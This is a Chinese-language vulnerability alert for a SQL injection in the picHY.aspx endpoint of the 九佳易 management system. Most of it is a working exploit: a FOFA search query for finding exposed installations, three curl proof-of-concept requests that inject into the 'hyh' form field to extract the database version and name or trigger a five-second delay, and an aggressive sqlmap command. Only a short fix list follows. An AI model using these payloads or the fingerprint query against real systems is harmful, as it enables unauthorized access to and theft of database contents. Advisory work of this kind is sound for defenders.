---
title: 【漏洞预警】九佳易管理系统 picHY.aspx SQL注入漏洞
---

## 漏洞概述
九佳易管理系统 picHY.aspx 接口存在SQL注入漏洞，攻击者可通过构造恶意参数获取数据库敏感信息。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 九佳易管理系统 picHY.aspx 接口 SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 影响组件 | picHY.aspx |
| 严重程度 | 高危 |

## FOFA查询
```
title="VSQL" && body="/Scripts/Login_A8/"
```

## POC
```bash
# 获取数据库版本
curl -X POST "http://target/HuiYuan/HuiYuanDangAn/picHY.aspx" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  --data-binary $'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="hyh"\r\n\r\n\'-1/@@version--\r\n------WebKitFormBoundary--'

# 获取数据库名
curl -X POST "http://target/HuiYuan/HuiYuanDangAn/picHY.aspx" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  --data-binary $'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="hyh"\r\n\r\n\'-1/db_name()--\r\n------WebKitFormBoundary--'

# 延时注入检测
curl -X POST "http://target/HuiYuan/HuiYuanDangAn/picHY.aspx" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  --data-binary $'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="hyh"\r\n\r\n\'-1;waitfor delay\'0:0:5\'--\r\n------WebKitFormBoundary--'
```

使用sqlmap:
```bash
sqlmap -u "http://target/HuiYuan/HuiYuanDangAn/picHY.aspx" \
  --data="hyh=test" --level=5 --risk=3
```

## 修复建议
1. 使用参数化查询
2. 实施严格输入验证
3. 升级到最新版本